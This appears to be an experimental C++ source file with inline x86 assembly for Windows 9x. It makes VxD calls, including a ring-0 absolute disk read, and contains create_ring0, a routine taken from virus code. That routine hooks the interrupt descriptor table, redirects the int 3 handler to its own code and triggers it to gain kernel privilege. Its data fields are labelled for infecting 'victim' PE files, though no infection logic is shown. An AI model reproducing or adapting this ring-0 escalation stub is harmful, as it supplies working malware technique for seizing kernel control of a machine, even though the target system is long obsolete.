#include <windows.h>
#include <stdio.h>
#include <iostream.h>

#define	VMM_Allocate_Temp_V86_Data_Area	0x000100A9
#define	VMM_Free_Temp_V86_Data_Area	0x000100AA
#define	IFSMgr_Ring0_FileIO	0x00400032
#define	R0_READABSOLUTEDISK	0xDD00	/* Absolute disk read */
#define	R0_WRITEABSOLUTEDISK	0xDE00	/* Absolute disk write */

const unsigned long	VWin32_Get_Version = 0x002A0000;
//#pragma optimize("", off)	//disable optimization for the inline asm
//void VxDCall();
extern "C" void VxDCall( void );	//issues VxD Win32-Services
//#pragma comment(lib, "VxDCall.lib")	//built by makefile

//void _stdcall VxDCall();
//extern "C" void VxDCall3();	//issues VxD Win32-Services


void Ring0()
{
	char buff[1024];
	unsigned int reg;
	for (int i=0; i<1024; i++) buff[i]=0;
	asm {
		pushad
		mov	eax,R0_READABSOLUTEDISK
		mov	ecx,1
		mov	edx,1
		mov	esi,dword ptr buff
		push	IFSMgr_Ring0_FileIO
		call	VxDCall
		mov	[reg],eax
		popad
	}
	cout << buff << "\n";
	cout << reg << "\n";

	asm iret
}

void create_ring0()
{
	asm {
start:
	call	get_delta

get_delta:
	pop	ebp
	sub	ebp,offset get_delta
	jmp	realstart				// jump over data

IDT_Address	dq 0					// IDT address
exception_	dd 0					// exception place
old_offset	dd 0					// real old offset
flag		db 0					// infection flag
newaddress	dd 0					// new virus place
filename	db 260 dup (0)				// victim's name
handle		dd 0					// victim's handle
crt_move	dd 0					// current movement in file
sec_ptr 	dd 0					// pointer to section
Old_EIP 	dd 0					// Old Entry point
S_Align 	dd 0					// section alignment
F_Align 	dd 0					// file alignment
SOI		dd 0					// size of image
peheader	dd 0					// pe header address
virusplace	dd 0					// virus place in victim
imagebase	dd 0					// imagebase of victim

SEH_oldpointer	dd ?					// SEH saved pointer
SEH_nextpointer dd ?					// SEH structure... old pointer
SEH_errorhandler	dd ?				// new pointer

realstart:
	mov	eax,dword ptr fs:[00H]			// get the old seh pointer
//ページフォルト
	mov	dword ptr [ebp+SEH_nextpointer],eax	// set in structure
	mov	dword ptr [ebp+SEH_oldpointer],eax	// and save for restore
	lea	eax,[ebp+return_to_host]		// make it point here...
	mov	dword ptr [ebp+SEH_errorhandler],eax
	lea	eax,[ebp+SEH_nextpointer]
	mov	dword ptr fs:[00H],eax			// and point the structure

	sidt	[ebp+IDT_Address]			// Get interrupt address
	mov	esi,dword ptr [ebp+IDT_Address+2]	// (first 2 are the length)
//	add	esi,exception_int*8			// get the offset for Int
	add	esi,3*8					// get the offset for Int
	mov	dword ptr [ebp+exception_],esi		// save exception place
	mov	bx,word ptr [esi+6]			// get low word
	shl	ebx,10H					// shift left
	mov	bx,word ptr [esi]			// get high word
	mov	dword ptr [ebp+old_offset],ebx		// save exception offset
	lea	eax,[ebp+offset Ring0]			// eax=new Int handler
	mov	word ptr [esi],ax			// store high word
	shr	eax,10H					// shift right
	mov	word ptr [esi+6],ax			// and store low word

go_on_to_ring0:
//	int	exception_int				// Generate exception -> Ring0 !
	int	3					// Generate exception -> Ring0 !

already_installed:
	mov	esi,dword ptr [ebp+exception_]		// restore IDT address
	mov	ebx,dword ptr [ebp+old_offset]		// restore exception offset
	mov	word ptr [esi],bx			// restore exception
	shr	ebx,10H					// handler
	mov	word ptr [esi+6],bx

return_to_host:
	mov	eax,dword ptr [ebp+SEH_oldpointer]	// restore the old SEH pointer
	mov	dword ptr fs:[00H],eax

exit:
//	cmp	ebp,0
//	je	generation_1
//	mov	eax,[ebp+Old_EIP]
//	add	eax,[ebp+imagebase]
//	jmp	eax

//generation_1:
//	Push	0
//	Call	ExitProcess				// and exit

//	ret
	}
}


void main()
{
	unsigned short ver;

	asm {
		pushad
		push	VWin32_Get_Version
		call	VxDCall
		mov		[ver],ax
		popad
	}

	cout << "vwin version " << ver << "\n";

	unsigned int _EAX;
	asm {
		pushad
//		push	dword 0
//		push	dword 512
		mov	ecx,512
		mov	edx,0
		push	VMM_Allocate_Temp_V86_Data_Area
//		call	VxDCall3
		call	VxDCall
		mov	[_EAX],eax
		push	VMM_Free_Temp_V86_Data_Area
		call	VxDCall
		popad
	}
	cout << "eax " << _EAX << "\n";

	char buff[1024];
	unsigned int reg;
	for (int i=0; i<1024; i++) buff[i]=0;
	asm {
		pushad
		mov	eax,R0_READABSOLUTEDISK
		mov	ecx,1
		mov	edx,1
		mov	esi,dword ptr buff
		push	IFSMgr_Ring0_FileIO
		call	VxDCall
		mov	[reg],eax
		popad
	}
	cout << "read buff" << buff << "\n";
	cout << "read err" << reg << "\n";

	// vxd call for vxd
/*	asm {
		pushad
		int	0x20
		dd	0x00010000
		mov	[reg],eax
		popad
	}
	cout << reg << "\n";*/

	asm {
		pushad
/*		push	0x00010001	// Get_Cur_VM_Handle
//		push	0x00010003	// Get_Sys_VM_Handle
		call	VxDCall		// stack err
		mov	[reg],ebx	// VM handle
*/
/*		mov	edi,dword ptr buff
		push	0x0001008D	// Save_Client_State
		call	VxDCall

		mov	ebp,dword ptr buff
//		mov	ebx,[reg]
		mov	ecx,1024*/
		popad
	}
//	cout << "handle" << reg << "\n";

	create_ring0();
}
